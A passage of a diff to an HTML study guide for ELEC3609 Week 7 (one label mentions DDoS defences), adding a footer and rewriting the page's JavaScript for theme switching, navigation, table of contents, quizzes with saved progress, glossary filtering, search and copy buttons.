DDoS, their mechanics, and the appropriate defences.</label></div>
+</section>
   </main>
 </div>
-<button class="totop" id="toTop" type="button" aria-label="Back to top">↑</button>
+
+<footer class="site-footer">
+  <div class="footer-nav">
+    <a href="../../../index.html">⌂ All guides</a>
+    <a href="../week_6/ELEC3609_week6_2025_study_guide.html">← Week 6</a>
+    <a href="../week_8/ELEC3609_week8_2025_study_guide.html">Week 8 →</a>
+  </div>
+  <p>ELEC3609/9609 Internet Software Platforms · Week 7 · Independent study guide for active recall. Always reconcile with the official lecture material.</p>
+</footer>
+
+<button class="to-top" id="toTop" aria-label="Back to top">↑</button>
+
 <script>
 (function(){
-  var GUIDE_ID = "elec3609-week7-2025-study-guide";
+  "use strict";
+
+  /* ---------- Theme ---------- */
   var root = document.documentElement;
-  /* theme */
-  var stored = null;
-  try { stored = localStorage.getItem("sg-theme"); } catch(e){}
-  var prefersDark = window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches;
-  setTheme(stored || (prefersDark ? "dark" : "light"));
-  function setTheme(t){
-    root.setAttribute("data-theme", t);
-    var b = document.getElementById("themeBtn");
-    if (b) b.textContent = t === "dark" ? "☀️" : "🌙";
-    try { localStorage.setItem("sg-theme", t); } catch(e){}
+  var themeBtn = document.getElementById('themeToggle');
+  try {
+    var saved = localStorage.getItem('elec3609-theme');
+    if (saved) root.setAttribute('data-theme', saved);
+    else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) root.setAttribute('data-theme','dark');
+  } catch(e){}
+  if (themeBtn) themeBtn.addEventListener('click', function(){
+    var next = root.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+    root.setAttribute('data-theme', next);
+    try { localStorage.setItem('elec3609-theme', next); } catch(e){}
+  });
+
+  /* ---------- Mobile nav ---------- */
+  var menuBtn = document.getElementById('menuToggle');
+  var scrim = document.getElementById('scrim');
+  function setNav(open){
+    document.body.classList.toggle('nav-open', open);
+    if (menuBtn) menuBtn.setAttribute('aria-expanded', open ? 'true' : 'false');
+    if (scrim) scrim.hidden = !open;
   }
-  document.getElementById("themeBtn").addEventListener("click", function(){
-    setTheme(root.getAttribute("data-theme") === "dark" ? "light" : "dark");
-  });
-  document.getElementById("printBtn").addEventListener("click", function(){ window.print(); });
+  if (menuBtn) menuBtn.addEventListener('click', function(){ setNav(!document.body.classList.contains('nav-open')); });
+  if (scrim) scrim.addEventListener('click', function(){ setNav(false); });
 
-  /* mobile drawer */
-  var sidebar = document.getElementById("sidebar"), scrim = document.getElementById("scrim");
-  function closeDrawer(){ sidebar.classList.remove("open"); scrim.classList.remove("show"); }
-  document.getElementById("menuBtn").addEventListener("click", function(){
-    sidebar.classList.toggle("open"); scrim.classList.toggle("show");
-  });
-  scrim.addEventListener("click", closeDrawer);
-  sidebar.addEventListener("click", function(e){ if (e.target.closest("a")) closeDrawer(); });
+  /* ---------- Build table of contents ---------- */
+  var sections = Array.prototype.slice.call(document.querySelectorAll('.guide-section'));
+  var toc = document.getElementById('toc');
+  var tocLinks = [];
+  if (toc){
+    sections.forEach(function(sec){
+      var title = sec.getAttribute('data-title') || (sec.querySelector('.section-title') ? sec.querySelector('.section-title').textContent : 'Section');
+      if (!sec.id) sec.id = 'sec-' + tocLinks.length;
+      var a = document.createElement('a');
+      a.href = '#' + sec.id;
+      a.className = 'toc-link';
+      a.innerHTML = '<span class="n">' + String(tocLinks.length + 1).padStart(2,'0') + '</span>' + title;
+      a.addEventListener('click', function(){ setNav(false); });
+      toc.appendChild(a);
+      tocLinks.push(a);
+    });
+  }
 
-  /* progress bar + back to top */
-  var bar = document.getElementById("progress"), toTop = document.getElementById("toTop");
+  /* ---------- Scrollspy + reading progress ---------- */
+  var fill = document.getElementById('progressFill');
+  var toTop = document.getElementById('toTop');
   function onScroll(){
-    var h = document.documentElement;
-    var max = h.scrollHeight - h.clientHeight;
-    var pct = max > 0 ? (h.scrollTop / max) * 100 : 0;
-    bar.style.width = pct + "%";
-    toTop.classList.toggle("show", h.scrollTop > 600);
+    var doc = document.documentElement;
+    var max = doc.scrollHeight - doc.clientHeight;
+    var pct = max > 0 ? (doc.scrollTop / max) * 100 : 0;
+    if (fill) fill.style.width = pct + '%';
+    if (toTop) toTop.classList.toggle('show', doc.scrollTop > 500);
   }
-  window.addEventListener("scroll", onScroll, {passive:true});
+  window.addEventListener('scroll', onScroll, {passive:true});
   onScroll();
-  toTop.addEventListener("click", function(){ window.scrollTo({top:0, behavior:"smooth"}); });
+  if (toTop) toTop.addEventListener('click', function(){ window.scrollTo({top:0, behavior:'smooth'}); });
 
-  /* active toc + reveal */
-  var links = Array.prototype.slice.call(document.querySelectorAll(".toc-link"));
-  var sections = Array.prototype.slice.call(document.querySelectorAll(".section"));
-  if ("IntersectionObserver" in window) {
-    var rev = new IntersectionObserver(function(entries){
-      entries.forEach(function(en){ if (en.isIntersecting) en.target.classList.add("in"); });
-    }, {rootMargin:"0px 0px -8% 0px", threshold:0.05});
-    sections.forEach(function(s){ rev.observe(s); });
-
-    var spy = new IntersectionObserver(function(entries){
-      entries.forEach(function(en){
-        if (!en.isIntersecting) return;
-        var id = en.target.id;
-        links.forEach(function(a){ a.classList.toggle("active", a.getAttribute("href") === "#" + id); });
+  if ('IntersectionObserver' in window && tocLinks.length){
+    var visible = {};
+    var io = new IntersectionObserver(function(entries){
+      entries.forEach(function(en){ visible[en.target.id] = en.isIntersecting ? en.intersectionRatio : 0; });
+      var bestId = null, best = 0;
+      Object.keys(visible).forEach(function(id){ if (visible[id] > best){ best = visible[id]; bestId = id; } });
+      tocLinks.forEach(function(a){
+        var on = bestId && a.getAttribute('href') === '#' + bestId;
+        a.classList.toggle('active', !!on);
       });
-    }, {rootMargin:"-15% 0px -70% 0px", threshold:0});
-    sections.forEach(function(s){ spy.observe(s); });
-  } else {
-    sections.forEach(function(s){ s.classList.add("in"); });
+    }, {rootMargin:'-80px 0px -55% 0px', threshold:[0, .12, .3, .6, 1]});
+    sections.forEach(function(s){ io.observe(s); });
   }
 
-  /* copy buttons */
-  document.addEventListener("click", function(e){
-    var btn = e.target.closest("[data-copy]");
-    if (!btn) return;
-    var code = btn.parentElement.querySelector("code");
-    if (!code) return;
-    var text = code.innerText;
-    var done = function(){ btn.textContent = "Copied"; btn.classList.add("done"); setTimeout(function(){ btn.textContent = "Copy"; btn.classList.remove("done"); }, 1400); };
-    if (navigator.clipboard && navigator.clipboard.writeText) { navigator.clipboard.writeText(text).then(done, done); }
-    else { var ta = document.createElement("textarea"); ta.value = text; document.body.appendChild(ta); ta.select(); try{document.execCommand("copy");}catch(err){} document.body.removeChild(ta); done(); }
+  /* ---------- Quizzes ---------- */
+  var quizzes = Array.prototype.slice.call(document.querySelectorAll('.quiz'));
+  var masteryKey = 'elec3609-ELEC3609_week7_2025_study_guide-mastery';
+  function updateMastery(){
+    var done = document.querySelectorAll('.quiz.done').length;
+    var label = document.getElementById('masteryLabel');
+    var mfill = document.getElementById('masteryFill');
+    if (label) label.textContent = done + ' / ' + quizzes.length;
+    if (mfill) mfill.style.width = (quizzes.length ? (done / quizzes.length) * 100 : 0) + '%';
+  }
+  quizzes.forEach(function(q, i){
+    if (!q.id) q.id = 'q' + (i + 1);
+    var head = q.querySelector('.quiz-head');
+    var reveal = q.querySelector('.quiz-reveal');
+    var box = q.querySelector('.mastered input');
+    function toggle(){ q.classList.toggle('open'); }
+    if (head) { head.style.cursor = 'pointer'; head.addEventListener('click', toggle); }
+    if (reveal) { reveal.addEventListener('click', function(e){ e.stopPropagation(); toggle(); }); }
+    if (box){
+      try { if (localStorage.getItem(masteryKey + ':' + q.id) === '1'){ box.checked = true; q.classList.add('done'); } } catch(e){}
+      box.addEventListener('change', function(){
+        q.classList.toggle('done', box.checked);
+        try { localStorage.setItem(masteryKey + ':' + q.id, box.checked ? '1' : '0'); } catch(e){}
+        updateMastery();
+      });
+    }
+  });
+  updateMastery();
+
+  var revealAll = document.getElementById('revealAll');
+  var hideAll = document.getElementById('hideAll');
+  var resetProgress = document.getElementById('resetProgress');
+  if (revealAll) revealAll.addEventListener('click', function(){ quizzes.forEach(function(q){ q.classList.add('open'); }); });
+  if (hideAll) hideAll.addEventListener('click', function(){ quizzes.forEach(function(q){ q.classList.remove('open'); }); });
+  if (resetProgress) resetProgress.addEventListener('click', function(){
+    quizzes.forEach(function(q){
+      q.classList.remove('open','done');
+      var b = q.querySelector('.mastered input');
+      if (b) b.checked = false;
+      try { localStorage.removeItem(masteryKey + ':' + q.id); } catch(e){}
+    });
+    updateMastery();
   });
 
-  /* glossary filter */
-  var termSearch = document.getElementById("termSearch");
-  if (termSearch) {
-    var terms = Array.prototype.slice.call(document.querySelectorAll(".term"));
-    var count = document.getElementById("termCount");
-    var update = function(){
-      var q = termSearch.value.trim().toLowerCase();
+  /* ---------- Glossary filter ---------- */
+  var chips = Array.prototype.slice.call(document.querySelectorAll('.chip[data-cat]'));
+  chips.forEach(function(chip){
+    chip.addEventListener('click', function(){
+      chips.forEach(function(c){ c.classList.remove('active'); });
+      chip.classList.add('active');
+      var cat = chip.getAttribute('data-cat');
       var shown = 0;
-      terms.forEach(function(t){
-        var hit = !q || (t.getAttribute("data-term") || "").indexOf(q) !== -1;
-        t.classList.toggle("hide", !hit);
-        if (hit) shown++;
+      document.querySelectorAll('.term-card').forEach(function(card){
+        var ok = cat === 'all' || card.getAttribute('data-cat') === cat;
+        card.classList.toggle('hidden', !ok);
+        if (ok) shown++;
       });
-      if (count) count.textContent = shown + " / " + terms.length + " shown";
-    };
-    termSearch.addEventListener("input", update);
-    update();
-  }
-
-  /* exam interactions */
-  var quizzes = Array.prototype.slice.call(document.querySelectorAll(".quiz"));
-  quizzes.forEach(function(q){
-    var head = q.querySelector(".quiz-q");
-    head.addEventListener("click", function(){
-      q.classList.toggle("open");
-      head.setAttribute("aria-expanded", q.classList.contains("open") ? "true" : "false");
+      var note = document.getElementById('glossaryEmpty');
+      if (note) note.style.display = shown ? 'none' : 'block';
     });
   });
-  var doneEl = document.getElementById("examDone"), fillEl = document.getElementById("examFill");
-  var boxes = Array.prototype.slice.call(document.querySelectorAll("[data-mastered]"));
-  var total = boxes.length;
-  function examKey(){ return "sg-exam-" + GUIDE_ID; }
-  function loadExam(){
-    var data = {};
-    try { data = JSON.parse(localStorage.getItem(examKey()) || "{}"); } catch(e){}
-    boxes.forEach(function(b){ b.checked = !!data[b.getAttribute("data-mastered")]; });
-  }
-  function saveExam(){
-    var data = {};
-    boxes.forEach(function(b){ if (b.checked) data[b.getAttribute("data-mastered")] = 1; });
-    try { localStorage.setItem(examKey(), JSON.stringify(data)); } catch(e){}
-  }
-  function refreshExam(){
-    var done = boxes.filter(function(b){ return b.checked; }).length;
-    if (doneEl) doneEl.textContent = done;
-    if (fillEl) fillEl.style.width = total ? (done / total) * 100 + "%" : "0%";
-  }
-  boxes.forEach(function(b){ b.addEventListener("change", function(){ saveExam(); refreshExam(); }); });
-  if (boxes.length) { loadExam(); refreshExam(); }
-  var revealAll = document.getElementById("revealAll");
-  var hideAll = document.getElementById("hideAll");
-  var resetExam = document.getElementById("resetExam");
-  if (revealAll) revealAll.addEventListener("click", function(){ quizzes.forEach(function(q){ q.classList.add("open"); }); });
-  if (hideAll) hideAll.addEventListener("click", function(){ quizzes.forEach(function(q){ q.classList.remove("open"); }); });
-  if (resetExam) resetExam.addEventListener("click", function(){ boxes.forEach(function(b){ b.checked = false; }); saveExam(); refreshExam(); });
 
-  /* search */
-  var input = document.getElementById("searchInput");
-  var box = document.getElementById("searchResults");
-  var index = sections.map(function(s){
-    var h = s.querySelector("h2");
-    return { id: s.id, title: h ? h.textContent : "", text: s.innerText.replace(/\s+/g, " ").trim() };
-  });
+  /* ---------- Search ---------- */
+  var input = document.getElementById('searchInput');
+  var suggest = document.getElementById('suggest');
   function runSearch(){
-    var q = input.value.trim().toLowerCase();
-    box.innerHTML = "";
-    if (q.length < 2) { box.classList.remove("open"); return; }
-    var hits = index.filter(function(it){ return (it.title + " " + it.text).toLowerCase().indexOf(q) !== -1; }).slice(0, 8);
-    if (!hits.length) { box.innerHTML = '<div class="sr-empty">No matches</div>'; box.classList.add("open"); return; }
-    hits.forEach(function(it){
-      var low = it.text.toLowerCase(), at = low.indexOf(q);
-      var snippet = at >= 0 ? it.text.slice(Math.max(0, at - 30), at + 70) : it.title;
-      var b = document.createElement("button");
-      b.type = "button"; b.className = "sr-item";
-      b.innerHTML = "<b></b><span></span>";
-      b.querySelector("b").textContent = it.title;
-      b.querySelector("span").textContent = "…" + snippet + "…";
-      b.addEventListener("click", function(){
-        document.getElementById(it.id).scrollIntoView({behavior:"smooth", block:"start"});
-        box.classList.remove("open"); input.blur();
+    if (!suggest) return;
+    var q = (input.value || '').trim().toLowerCase();
+    suggest.innerHTML = '';
+    if (!q){ suggest.classList.remove('open'); return; }
+    var hits = [];
+    sections.forEach(function(sec){
+      var t = (sec.getAttribute('data-title') || '') + ' ' + sec.textContent;
+      if (t.toLowerCase().indexOf(q) !== -1){
+        hits.push({href:'#' + sec.id, label: sec.getAttribute('data-title') || sec.id});
+      }
+    });
+    document.querySelectorAll('.term-card').forEach(function(card){
+      if (card.textContent.toLowerCase().indexOf(q) !== -1){
+        var name = card.querySelector('.term-name');
+        hits.push({href:'#glossary', label:'Term: ' + (name ? name.textContent : '')});
+      }
+    });
+    var seen = {}; var out = [];
+    hits.forEach(function(h){ if (!seen[h.label]){ seen[h.label] = 1; out.push(h); } });
+    out = out.slice(0, 12);
+    if (!out.length){
+      suggest.innerHTML = '<div class="none">No matches for “' + q.replace(/[<>&]/g,'') + '”.</div>';
+    } else {
+      out.forEach(function(h){
+        var a = document.createElement('a');
+        a.href = h.href; a.textContent = h.label;
+        a.addEventListener('click', function(){ suggest.classList.remove('open'); input.value=''; });
+        suggest.appendChild(a);
       });
-      box.appendChild(b);
-    });
-    box.classList.add("open");
+    }
+    suggest.classList.add('open');
   }
-  if (input) {
-    input.addEventListener("input", runSearch);
-    input.addEventListener("keydown", function(e){
-      if (e.key === "Enter") { var first = box.querySelector(".sr-item"); if (first) first.click(); }
-      if (e.key === "Escape") { box.classList.remove("open"); input.blur(); }
-    });
-    document.addEventListener("click", function(e){ if (!e.target.closest(".search")) box.classList.remove("open"); });
+  if (input){
+    input.addEventListener('input', runSearch);
+    input.addEventListener('focus', runSearch);
   }
+  document.addEventListener('click', function(e){
+    if (suggest && !e.target.closest('.search')) suggest.classList.remove('open');
+  });
+
+  /* ---------- Checklist persistence ---------- */
+  document.querySelectorAll('.checklist input[type="checkbox"]').forEach(function(box, i){
+    var key = 'elec3609-ELEC3609_week7_2025_study_guide-check-' + i;
+    try { if (localStorage.getItem(key) === '1') box.checked = true; } catch(e){}
+    box.addEventListener('change', function(){ try { localStorage.setItem(key, box.checked ? '1' : '0'); } catch(e){} });
+  });
 })();
 </script>
+
+<script>
+(function(){
+  "use strict";
+  document.addEventListener('click', function(e){
+    var btn = e.target.closest('.code-copy');
+    if (!btn) return;
+    var code = btn.parentElement.querySelector('code');
+    if (!code) return;
+    var text = code.innerText;
+    var done = function(){ btn.textContent = 'Copied'; btn.classList.add('done'); setTimeout(function(){ btn.textContent='Copy'; btn.classList.remove('done'); }, 1400); };
+    if (navigator.clipboard && navigator.clipboard.writeText) { navigator.clipboard.writeText(text).then(done, done); }
+    else { var ta=document.createElement('textarea'); ta.value=text; document.body.appendChild(ta); ta.select(); try{document.execCommand('copy');}catch(err){} document.body.removeChild(ta); done(); }
+  });
+})();
+</script>
+
 </body>
 </html>
